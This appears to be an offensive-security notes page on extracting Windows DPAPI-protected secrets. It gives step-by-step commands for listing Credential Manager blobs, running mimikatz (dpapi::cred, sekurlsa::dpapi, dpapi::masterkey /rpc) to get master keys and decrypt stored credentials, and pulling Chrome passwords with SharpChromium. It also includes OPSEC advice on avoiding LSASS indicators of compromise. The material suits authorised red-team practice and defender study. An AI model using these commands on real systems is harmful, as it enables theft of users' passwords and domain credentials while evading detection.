## Data Protection API

This is a feature in Windows used to securely store credentials and provides a cryptographically secure API for Windows programmers to use. The keys used are tired to the computer or user that the encryption is occurring under. DPAPI is used to store credentials in the Credential Manager and also to store Browser credentials.

### Credential Manager

Credentials are generally stored in the AppData folder. The existence of a string in this folder suggests there is an encrypted blob being stored.

```powershell
dir -Force C:\Users\Neo\AppData\Local\Microsoft\Credentials
```

We can use a built in command-line query to test if there's any credentials in the Credential Manager.

```powershell
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

To extract them, we'll need to obtain the master encryption key using mimikatz.

```powershell
dpapi::cred /in:C:\Users\Neo\AppData\Local\Microsoft\Credentials\918E6E555E527509CD2B19FFB5E4806B
```
The output will contant a `pbData` and `guidMasterKey` field. The former is the encrypted data, the latter the GUID of the master key needed to decrypt it. Master keys are stored in `c:\Users\Neo\AppData\Roaming\Microsoft\Protect\<USER SID>`

```powershell
dir /a c:\Users\Neo\AppData\Roaming\Microsoft\Protect\S-1-5-21-3619591028-1129495842-3952564-1001
...
02/01/2022  19:58               468 13d5aadd-0f71-40c7-8785-e0b1ad0dedf3
...
```

In a high-integry session, we can use:

```powershell
# Not great OPSEC as this interacts with LSASS leaving IoCs!
sekurlsa::dpapi
```

Better OPSEC is to use a query to the Domain Controller over RPC.

```powershell
dpapi::masterkey /in:C:\Users\Neo\AppData\Roaming\Microsoft\Protect\S-1-5-21-3619591028-1129495842-3952564-1001\13d5aadd-0f71-40c7-8785-e0b1ad0dedf3 /rpc
```

This outputs a `key` field, which can be then passed to the initial encrypted credential blob identified using mimikatz.

```powershell
dpapi::cred /in:C:\Users\Neo\AppData\Local\Microsoft\Credentials\918E6E555E527509CD2B19FFB5E4806B /masterkey:4fe205785f890e3d7a52f1755a35078736eecb5ea6a23bb8619fca7cfc31ae4e6fd029e6036cde245329c635a683988e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```

### Chrome Passwords

Chrome stores passowrds in a local SQLite database. If the following location has files, it's likely they can be extracted.

```powershell
dir /a "C:\Users\Neo\AppData\Local\Google\Chrome\User Data\Default"
```

This can be done using:

 https://github.com/djhohnstein/SharpChromium 